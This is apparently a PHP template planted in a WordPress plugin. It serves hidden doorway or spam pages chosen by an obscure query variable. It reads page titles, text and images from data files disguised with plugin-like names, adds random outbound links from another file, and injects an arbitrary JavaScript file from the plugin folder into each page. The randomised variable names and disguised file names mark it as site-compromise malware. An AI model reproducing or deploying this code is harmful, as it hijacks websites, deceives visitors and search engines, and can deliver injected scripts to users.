<?php
$q4getU = intval(get_query_var('omhdevls'));

if ($q4getU < 1 || $q4getU > 5186) return;
$wOc4FikG = file(plugin_dir_path(__FILE__).'integrate-header.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$cOuLIlu = explode(';', $wOc4FikG[$q4getU]);
if (count($cOuLIlu) < 2) return;
$aYsTv = $cOuLIlu[0];
$gIBLj1y  = $cOuLIlu[1];
$baoWcC = $cOuLIlu[2];
$cNk5Je3  = $cOuLIlu[3];
$kznPRkfs2K = $cOuLIlu[4];
set_query_var('dbzon', $aYsTv);

$tByGxG = '';
$bjnlZ5TFZh = plugin_dir_path(__FILE__).'rates-fx.php';
if (is_file($bjnlZ5TFZh)) {
	$xqO2Hw6wt = file($bjnlZ5TFZh, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($xqO2Hw6wt);
	shuffle($xqO2Hw6wt);
	$jALKDlgNe = mt_rand(2, 5);
	if (count($xqO2Hw6wt) > $jALKDlgNe) {
		for ($uUWce = 0; $uUWce < $jALKDlgNe; $uUWce++) {
			$wftUASjjP = array_shift($xqO2Hw6wt);
			$tByGxG .= '<p><a href="'.$wftUASjjP.'">'.$wftUASjjP.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $aYsTv; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $gIBLj1y . "</p>\n";
				if (strlen($cNk5Je3) > 0) echo "<p>" . $cNk5Je3 . "</p>\n";
				if (strlen($baoWcC) > 0) echo "<p>" . $baoWcC . "</p>\n";
				if (strlen($kznPRkfs2K) > 0) echo '<p><a href="#"><img src="'.$kznPRkfs2K.'"></a>' . "</p>\n";
				echo $tByGxG;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$q3mn1Padwp = plugin_dir_path(__FILE__) . 'current-blog.js';
if (is_file($q3mn1Padwp)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($q3mn1Padwp);
	echo '</script>';
}
get_footer();
?>
